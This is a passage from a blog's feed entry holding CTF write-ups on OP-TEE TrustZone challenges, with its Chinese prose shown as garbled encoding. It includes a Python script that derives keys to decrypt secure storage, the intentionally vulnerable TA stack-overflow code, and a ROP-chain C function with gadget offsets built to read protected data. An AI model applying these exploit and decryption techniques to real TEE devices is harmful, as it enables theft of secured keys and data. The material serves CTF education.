alt="Block Data Encryption"></a></p><p>æ€è·¯å°±å¤§æ¦‚æ˜¯</p><ol><li>é€šè¿‡ <code>HUK </code> å’Œ <code>chip id</code> è®¡ç®—å‡º <code>SSK</code></li><li>é€šè¿‡è®¡ç®—å‡ºæ¥çš„<code>SSk</code> å’Œ <code>TA UUID</code>è®¡ç®—å‡º <code>TSK</code></li><li>é€šè¿‡è®¡ç®—å‡ºçš„ <code>TSK</code> å’Œ è¢«åŠ å¯†çš„ <code>FEK</code> è®¡ç®—å‡ºæ˜æ–‡ <code>FEK</code> </li><li>æœ€åé€šè¿‡ <code>FEK</code> è§£å‡ºæ˜æ–‡çš„æ•°æ®</li></ol><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201241428539.png" title="image-20220124142822275" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201241428539.png" alt="image-20220124142822275"></a></p><p>å…¶ä¸­è¢«åŠ å¯†çš„ <code>FEK</code> å­˜å‚¨åœ¨ <code>/data/tee/2</code> æ–‡ä»¶ä¸­ï¼Œå¯ä»¥å‚è€ƒå¦‚ä¸‹ 010 tempteç»“æ„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;------------------------------------------------</span><br><span class="line">&#x2F;&#x2F;--- 010 Editor v10.0.2 Binary Template</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;      File: </span><br><span class="line">&#x2F;&#x2F;   Authors: </span><br><span class="line">&#x2F;&#x2F;   Version: </span><br><span class="line">&#x2F;&#x2F;   Purpose: </span><br><span class="line">&#x2F;&#x2F;  Category: </span><br><span class="line">&#x2F;&#x2F; File Mask: </span><br><span class="line">&#x2F;&#x2F;  ID Bytes: </span><br><span class="line">&#x2F;&#x2F;   History: </span><br><span class="line">&#x2F;&#x2F;------------------------------------------------</span><br><span class="line">#define TEE_FS_HTREE_IV_SIZE 16</span><br><span class="line">#define TEE_FS_HTREE_TAG_SIZE 16</span><br><span class="line">#define TEE_FS_HTREE_FEK_SIZE 16</span><br><span class="line"></span><br><span class="line">typedef struct _tee_fs_htree_meta &#123;</span><br><span class="line">UINT64 length;</span><br><span class="line">&#125;tee_fs_htree_meta;</span><br><span class="line"></span><br><span class="line">typedef struct _tee_fs_htree_imeta &#123;</span><br><span class="line">struct tee_fs_htree_meta meta;</span><br><span class="line">UINT32 max_node_id;</span><br><span class="line">    UINT32 nop;</span><br><span class="line">&#125;tee_fs_htree_imeta;</span><br><span class="line"></span><br><span class="line">typedef struct _tee_fs_htree_image &#123;</span><br><span class="line">UCHAR iv[TEE_FS_HTREE_IV_SIZE];</span><br><span class="line">UCHAR tag[TEE_FS_HTREE_TAG_SIZE];</span><br><span class="line">UCHAR enc_fek[TEE_FS_HTREE_FEK_SIZE];</span><br><span class="line">UCHAR imeta[sizeof(struct tee_fs_htree_imeta)];</span><br><span class="line">UINT32 counter;</span><br><span class="line">&#125;tee_fs_htree_image;</span><br><span class="line"></span><br><span class="line">#define TEE_FS_HTREE_HASH_SIZE32</span><br><span class="line">#define TEE_FS_HTREE_IV_SIZE 16</span><br><span class="line">#define TEE_FS_HTREE_TAG_SIZE 16</span><br><span class="line">typedef struct _tee_fs_htree_node_image &#123;</span><br><span class="line">&#x2F;* Note that calc_node_hash() depends on hash first in struct *&#x2F;</span><br><span class="line">UCHAR hash[TEE_FS_HTREE_HASH_SIZE];</span><br><span class="line">UCHAR iv[TEE_FS_HTREE_IV_SIZE];</span><br><span class="line">UCHAR tag[TEE_FS_HTREE_TAG_SIZE];</span><br><span class="line">USHORT flags;</span><br><span class="line">&#125;tee_fs_htree_node_image;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;--------------------------------------</span><br><span class="line">LittleEndian();</span><br><span class="line"></span><br><span class="line">tee_fs_htree_image  ver0_head;</span><br><span class="line">tee_fs_htree_image  ver1_head;</span><br><span class="line">FSeek(0x1000);</span><br><span class="line">tee_fs_htree_node_image ver0_root_node;</span><br><span class="line">tee_fs_htree_node_image ver1_root_node;</span><br><span class="line">FSeek(0x2000);</span><br></pre></td></tr></table></figure><h4 id="Solved"><a href="#Solved" class="headerlink" title="Solved"></a>Solved</h4><p>æœ€åè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> HMAC, SHA256</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#è®¡ç®—ssk</span></span><br><span class="line">    huk = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">16</span></span><br><span class="line">    chip_id = <span class="string">b&#x27;BEEF&#x27;</span> * <span class="number">8</span></span><br><span class="line">    print(chip_id)</span><br><span class="line">    ssk_str = <span class="string">b&#x27;ONLY_FOR_tee_fs_ssk\x00&#x27;</span></span><br><span class="line">    m = HMAC.new(huk, digestmod=SHA256)</span><br><span class="line">    m.update(chip_id)</span><br><span class="line">    m.update(ssk_str)</span><br><span class="line">    ssk = m.digest()</span><br><span class="line">    print(ssk)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#è®¡ç®—tsk</span></span><br><span class="line">    ta_uuid = <span class="string">b&#x27;\xbb\x50\xe7\xf4\x37\x14\xbf\x4f\x87\x85\x8d\x35\x80\xc3\x49\x94&#x27;</span> <span class="comment">#taçš„uuid</span></span><br><span class="line">    m = HMAC.new(ssk, digestmod=SHA256)</span><br><span class="line">    m.update(ta_uuid)</span><br><span class="line">    tsk = m.digest()</span><br><span class="line">    print(tsk)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#è§£fek</span></span><br><span class="line">    enc_fek = <span class="string">b&#x27;\xe4\x9a\x95\xf2\xb5\xf4\x9c\x04\xf6\x07\x9f\xfb\xf0\x2e\xd2\xef&#x27;</span>  <span class="comment">#2åœ¨headeré‡Œ</span></span><br><span class="line">    cipher = AES.new(tsk, AES.MODE_ECB)</span><br><span class="line">    fek = cipher.decrypt(enc_fek)</span><br><span class="line">    print(fek)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#è§£æ•°æ®</span></span><br><span class="line">    enc_data = <span class="string">b&#x27;....&#x27;</span></span><br><span class="line">    iv = <span class="string">b&#x27;\xb4\xc9\x6a\x22\xe6\x36\x72\xcf\x6a\x44\x8f\x10\xa3\x11\x44\x68&#x27;</span> <span class="comment">#å¯¹åº”node</span></span><br><span class="line">    cipher = AES.new(fek, AES.MODE_GCM, nonce=iv)</span><br><span class="line">    data = cipher.decrypt(enc_data)</span><br><span class="line">    print(data)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="UnTrustZone"><a href="#UnTrustZone" class="headerlink" title="UnTrustZone"></a>UnTrustZone</h3><p>é¢˜ç›®æè¿°</p><blockquote><p>UntrustZone</p><p>Score: <em>500</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pwn&#96;, &#96;difficulty:normal</span><br></pre></td></tr></table></figure><p>It is clearly not worth your trust.</p><p>The default username is root.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 47.243.205.105 8899</span><br></pre></td></tr></table></figure><p><a href="https://realworldctf-attachment.oss-accelerate.aliyuncs.com/UnstrustZone_d9d2151c29fa340f80f38197492001fe.tar.gz">attachment</a></p></blockquote><h4 id="TL-DR-1"><a href="#TL-DR-1" class="headerlink" title="TL;DR"></a>TL;DR</h4><p>è¿™ä¸ªé¢˜éœ€è¦è¡¥å……ä¸€äº›å…³äº <code>TrustZone</code> çš„å¦å¤–ä¸€éƒ¨åˆ†å…³äº <code>TA</code>å’Œ<code>CA</code>çš„å‰ç½®çŸ¥è¯†ã€‚ <code>TA</code> æ˜¯ Trusted Application çš„ç¼©å†™ï¼Œé€šå¸¸è¿è¡Œåœ¨ TEE ç¯å¢ƒä¸‹çš„åº”ç”¨ç®€ç§°ä¸º<code> TA</code>ã€‚<code>CA</code> æ˜¯ Client Application çš„ç¼©å†™ï¼Œé€šå¸¸è¿è¡Œåœ¨ REE ç¯å¢ƒä¸‹çš„åº”ç”¨ç®€ç§°ä¸º CAã€‚</p><p>ä¸€ä¸ªè®¿é—®å®‰å…¨OSçš„æœåŠ¡æµç¨‹ä¸ºï¼šæ‰“å¼€ TEE ç¯å¢ƒ &gt; å¼€å¯ä¸€ä¸ªä¼šè¯ &gt; å‘é€å‘½ä»¤ &gt; è·å–ä¿¡æ¯ &gt; ç»“æŸä¼šè¯ &gt; å…³é—­ TEE ç¯å¢ƒã€‚</p><p>å€ŸåŠ©OP-TEEæ¥å®ç°ç‰¹å®šå®‰å…¨éœ€æ±‚æ—¶ï¼Œä¸€æ¬¡å®Œæ•´çš„åŠŸèƒ½è°ƒç”¨ä¸€èˆ¬éƒ½æ˜¯èµ·æºäºCAï¼ŒTAåšå…·ä½“åŠŸèƒ½å®ç°å¹¶è¿”å›æ•°æ®åˆ°CAï¼Œè€Œæ•´ä¸ªè¿‡ç¨‹éœ€è¦ç»è¿‡OP-TEEçš„clientç«¯æ¥å£ï¼ŒOP-TEEåœ¨Linux kernelç«¯çš„é©±åŠ¨ï¼ŒMonitoræ¨¡å¼ä¸‹çš„SMCå¤„ç†ï¼ŒOP-TEE OSçš„threadå¤„ç†ï¼ŒOP-TEEä¸­çš„TAç¨‹åºè¿è¡Œï¼ŒOP-TEEç«¯åº•å±‚åº“æˆ–è€…ç¡¬ä»¶èµ„æºæ”¯æŒç­‰å‡ ä¸ªé˜¶æ®µã€‚å½“TAæ‰§è¡Œå®Œå…·ä½“è¯·æ±‚ä¹‹åä¼šæŒ‰ç…§åŸè·¯å¾„å°†å¾—åˆ°çš„æ•°æ®è¿”å›ç»™CAã€‚</p><h4 id="Ideas-1"><a href="#Ideas-1" class="headerlink" title="Ideas"></a>Ideas</h4><p>è®¾è®¡è¿™ä¸ªé¢˜ç›®çš„æ—¶å€™ï¼Œå°±åªæ˜¯æƒ³è®©é€‰æ‰‹äº†è§£ä¸‹ <code>TA</code> è¿™ä¸ªæ”»å‡»é¢ï¼Œæ‰€ä»¥æ¼æ´è®¾è®¡çš„å¾—ç‰¹åˆ«ç®€å•ï¼Œå°±æ˜¯ä¸€ä¸ªåœ¨<code>TA</code>ä¸­çš„æ ˆæº¢å‡ºï¼Œæˆ‘ä¿®æ”¹äº†é™„ä»¶ä¸­çš„<code>HUK</code>å’Œç­¾åæ—¶å€™çš„ key è®©ä»–ä¿æŒäºè¿œç¨‹çš„ä¸ä¸€è‡´ã€‚å¸Œæœ›é€‰æ‰‹é€šè¿‡ Pwn è¿™ä¸ª TAï¼Œ æ¥è·å– å®‰å…¨å­˜å‚¨ï¼Œå³ <code>/data/tee/2</code> ä¸‹è¢«åŠ å¯†çš„ flag ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">data_sz = params[<span class="number">1</span>].memref.size;</span><br><span class="line"><span class="comment">// data = TEE_Malloc(data_sz, 0); patch for challenge</span></span><br><span class="line"><span class="keyword">char</span> data[<span class="number">0x20</span>] ;</span><br><span class="line"><span class="keyword">if</span> (!data)</span><br><span class="line"><span class="keyword">return</span> TEE_ERROR_OUT_OF_MEMORY;</span><br><span class="line">TEE_MemMove(data, params[<span class="number">1</span>].memref.buffer, data_sz);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h5><p>å‚è€ƒï¼š <a href="https://github.com/ForgeRock/optee-build/blob/master/docs/debug.md#debugging-op-tee">optee-build/debug.md at master Â· ForgeRock/optee-build (github.com)</a></p><ul><li>æœ‰ æºç è°ƒè¯•ï¼š</li></ul><p>é¦–å…ˆå¯¹ ldelf çš„å…¥å£ä¸‹æ–­ï¼Œ <code>b thread_enter_user_mode</code></p><p>ç„¶åæ‰§è¡Œ CA ç¨‹åºï¼Œåœ¨ LOG çª—å£ä¸­æ‰¾åˆ° TA çš„åŠ è½½åœ°å€<br><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202112311553854.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202112311553854.png"></a></p><p>ç„¶åå¯¹ TA å…¥å£ä¸‹æ–­ï¼Œ <code>b *(baseaddr + TA_InvokeCommandEntryPoint_addr</code></p><ul><li><p>æ— æºç è°ƒè¯•</p><p>OP-TEE æœ‰æ—¥å¿—åŠŸèƒ½ï¼Œåœ¨æ—¥å¿—åŠŸèƒ½ä¸­èƒ½çœ‹åˆ° TA çš„åŠ è½½åœ°å€ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªè¿›è¡Œè°ƒè¯•</p></li></ul><h5 id="å†…å­˜å¸ƒå±€"><a href="#å†…å­˜å¸ƒå±€" class="headerlink" title="å†…å­˜å¸ƒå±€"></a>å†…å­˜å¸ƒå±€</h5><table><thead><tr><th>Text Address</th><th>File Name</th><th>Description</th></tr></thead><tbody><tr><td>0x0</td><td>bl1.elf</td><td>ARM Trusted Firmware Boot Loader Stage 1</td></tr><tr><td>0x1070</td><td>libteec.so</td><td>OP-TEE Client Shared Library [Normal World]</td></tr><tr><td>0x4009c0</td><td><CA></td><td>Client Application [Normal World]</td></tr><tr><td>0xe01b000</td><td>bl2.elf</td><td>ARM Trusted Firmware Boot Loader Stage 2</td></tr><tr><td>0xe040000</td><td>bl31.elf</td><td>ARM Trusted Firmware Boot Loader Stage 3-1</td></tr><tr><td>0xe100000</td><td>tee.elf</td><td>OP-TEE</td></tr><tr><td>0xffff000008081000</td><td>vmlinux</td><td>Linux Kernel [Normal World]</td></tr></tbody></table><ul><li>usermod</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">user modeå†…å­˜å¸ƒå±€</span><br><span class="line">E&#x2F;LD:  region  0: va 0x40004000 pa 0x0e300000 size 0x002000 flags rw-s (ldelf)</span><br><span class="line">E&#x2F;LD:  region  1: va 0x40006000 pa 0x0e302000 size 0x008000 flags r-xs (ldelf)</span><br><span class="line">E&#x2F;LD:  region  2: va 0x4000e000 pa 0x0e30a000 size 0x001000 flags rw-s (ldelf)</span><br><span class="line">E&#x2F;LD:  region  3: va 0x4000f000 pa 0x0e30b000 size 0x004000 flags rw-s (ldelf)</span><br><span class="line">E&#x2F;LD:  region  4: va 0x40013000 pa 0x0e30f000 size 0x001000 flags r--s</span><br><span class="line">E&#x2F;LD:  region  5: va 0x40014000 pa 0x0e32e000 size 0x001000 flags rw-s (stack)</span><br><span class="line">E&#x2F;LD:  region  6: va 0x40015000 pa 0x5f60a888 size 0x001000 flags rw-- (param)</span><br><span class="line">E&#x2F;LD:  region  7: va 0x4004d000 pa 0x00001000 size 0x012000 flags r-xs [0]</span><br><span class="line"> &#x2F;&#x2F;éšæœº </span><br><span class="line">E&#x2F;LD:  region  8: va 0x4005f000 pa 0x00013000 size 0x00c000 flags rw-s [0]</span><br><span class="line"> &#x2F;&#x2F;éšæœº</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬è€Œè¨€ï¼š ldelf  åŠ è½½åœ°å€æ˜¯å›ºå®šçš„ï¼Œ å¤„ç†ä»£ç ä½äº <code> build/optee*os/core/arch/arm/kernel/ldelf_loader.c</code></p><p><code>ldelf_load_ldelf</code> å‡½æ•°ä¸­ï¼Œ æœ€ååŠ è½½çš„baseä¸º  0x40006000, å…·ä½“ä»£ç å¯è§<code>build/optee_os/core/arch/arm/kernel/ldelf_loader.c</code></p><h4 id="Solved-1"><a href="#Solved-1" class="headerlink" title="Solved"></a>Solved</h4><p>è§£é¢˜å…³é”®æ˜¯éœ€è¦äº†è§£æ²¡æ³•ç›´æ¥è§£å¯†çš„æ—¶å€™ï¼Œæˆ‘ä»¬åº”è¯¥å¦‚ä½•è¯»å– flagï¼š</p><ol><li>TEE_AllocatePersistentObjectEnumerator</li><li>TEE_GetNextPersistentObject</li><li>TEE_OpenPersistentObject</li><li>TEE_ReadObjectData</li><li>memcpy data to buffer</li></ol><p>é¦–å…ˆï¼Œ <code>ldefl</code> åŠ è½½åŸºåœ°å€æ˜¯ä¸å˜çš„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸Šè¾¹æ‰¾ gadget ï¼Œ å¦å¤–è™½ç„¶ <code>TA</code>æœ‰éšæœºåŒ–ï¼Œä½†æ˜¯è¿™éšæœºåŒ–å¹¶ä¸æ˜¯å¾ˆé«˜ï¼Œå¯ä»¥é€šè¿‡çˆ†ç ´è§£å†³ã€‚æ‰€ä»¥ <code>TA</code> çš„ç¨‹åºä¹Ÿæ˜¯æ‰¾ gadget çš„ç›®æ ‡ä¹‹ä¸€ã€‚ldefl ç¨‹åºçš„ä»£ç æ®µæ˜¯è¢«é€šè¿‡ <code>ldelf_load_ldelf</code> å‡½æ•°æ˜¯å†™æ­»åœ¨ <code>bl32_extra1.bin</code>ä¸­çš„ã€‚</p><p>æœ€åæˆ‘ä»¬æ‰¾åˆ°çš„äº†å‡ ä¸ªå¯ä»¥è®¾ç½® 5 ä¸ªå‚æ•°çš„ gadgetã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">CallFun5</span><span class="params">(TEEC_Session* sess,<span class="keyword">uint64_t</span> func,<span class="keyword">uint64_t</span> x0,<span class="keyword">uint64_t</span> x1,<span class="keyword">uint64_t</span> x2,<span class="keyword">uint64_t</span> x3,<span class="keyword">uint64_t</span> x4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//å­˜æ”¾è¿”å›å†…å­˜çš„åœ°å€åœ¨ï¼šg_ta_addr+124D8</span></span><br><span class="line"><span class="comment">//è¿”å›åœ°å€0x00000000400152b0</span></span><br><span class="line">payload = (<span class="keyword">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">memset</span>(payload,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(payload,tmp,<span class="keyword">sizeof</span>(tmp));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;tmplen 0x%lx \n&quot;</span>,<span class="keyword">sizeof</span>(tmp));</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">48</span>) = <span class="number">0x40015150</span>;  <span class="comment">//next x19</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">56</span>) = <span class="number">0x40004008</span>;  <span class="comment">//next x20</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">40</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000003a28</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">672</span>) = x1 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>; <span class="comment">//next x1  [x19+0x10]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//x1 == [x19+0x10]</span></span><br><span class="line"><span class="comment">//0x0000000000003a28: ldr x1, [x19, #0x10]; add x0, x0, x1; str x0, [x20]; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x40; ret;</span></span><br><span class="line">*(<span class="keyword">uint32_t</span>*)(payload+<span class="number">108</span>) = <span class="number">0x40015777</span>; <span class="comment">//next 19</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">112</span>) = <span class="number">0x40014ff8</span>; <span class="comment">//next 20</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">64</span>) = <span class="number">0x40004010</span>; <span class="comment">//next x21</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">184</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000000C40</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">344</span>) = x2; <span class="comment">//next x2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//x2 = [SP,#0x70+va]</span></span><br><span class="line"><span class="comment">//0x0000000000000C40 E2 37 40 F9                                   LDR             X2, [SP,#0x70+va]</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">112</span>+<span class="number">0x38</span>) = <span class="number">0x40015150</span>; <span class="comment">//next x19</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">272</span>) = <span class="number">0x40004070</span>; <span class="comment">//next x21</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">304</span>) = <span class="number">0</span>; <span class="comment">//next x25</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">160</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000000EE0</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">672</span>+<span class="number">8</span>) = x0; <span class="comment">//next x0 [x19 + 0x18]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//x0 = [x19 + 0x18]</span></span><br><span class="line"><span class="comment">//text:0000000000000EE0 60 0E 40 F9                                   LDR             X0, [elf,#0x18] </span></span><br><span class="line"><span class="comment">//*(uint64_t*)(payload+360) = 0x40006000+0x000000000000064C;//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">432</span>) = x1; <span class="comment">//next x27</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">440</span>) = x3; <span class="comment">//next x28</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">360</span>) = g_ta_addr+<span class="number">0x000000000000aa00</span>;<span class="comment">//next pc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//x3 == x28  x1 == x27</span></span><br><span class="line"><span class="comment">//0x000000000000aa00 : mov x3, x28 ; csel x21, x21, x2, ne ; mov x1, x27 ; mov x2, x21 ; str x24, [sp, #0x78] ; blr x23</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">400</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000001f98</span>;<span class="comment">//next x23 next pc</span></span><br><span class="line"><span class="comment">//x21 == [sp, #0x20]</span></span><br><span class="line"><span class="comment">//0x0000000000001f98 : ldp x21, x22, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">376</span>) = <span class="number">0x40015170</span>; <span class="comment">//next x20</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">496</span>) = <span class="number">0x40015180</span>; <span class="comment">//next x21</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">472</span>) = g_ta_addr + <span class="number">0x0000000000005fa4</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">696</span>) = x4; <span class="comment">//next x4 == [x20, #8]</span></span><br><span class="line"><span class="comment">//x4 == [x20, #8]</span></span><br><span class="line"><span class="comment">//x1 == [x21, #8]</span></span><br><span class="line"><span class="comment">//0x0000000000005fa4 : ldr x4, [x20, #8] ; ldr x0, [x21, #8] ; cmp x4, x0 ; b.hi #0x5fc8 ; mov w0, w9 ; ldp x19, x20, [sp, #0x10] ; ldr x21, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">528</span>) = <span class="number">0x40015180</span>; <span class="comment">//next x19</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">544</span>) = <span class="number">0x40004070</span>; <span class="comment">//next x21</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">416</span>) = <span class="number">0xFFFFFFFFFFFFF001</span>; <span class="comment">//next x25</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">520</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000000EE0</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">728</span>) = x0; <span class="comment">//next x0 [x19 + 0x18]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//text:0000000000000EE0 60 0E 40 F9                                   LDR             X0, [elf,#0x18] </span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">568</span>) = func;<span class="comment">//0x40006000+0x000000000000064C;//next pc</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.daimajiaoliu.com/daima/4872449c3100404">OP-TEEä¸­secure stroageâ€”â€”å®‰å…¨å­˜å‚¨ä½¿ç”¨çš„keyçš„äº§ç”Ÿ (daimajiaoliu.com)</a></p><p><a href="https://optee.readthedocs.io/en/latest/">OP-TEE Documentation â€” OP-TEE documentation documentation (optee.readthedocs.io)</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
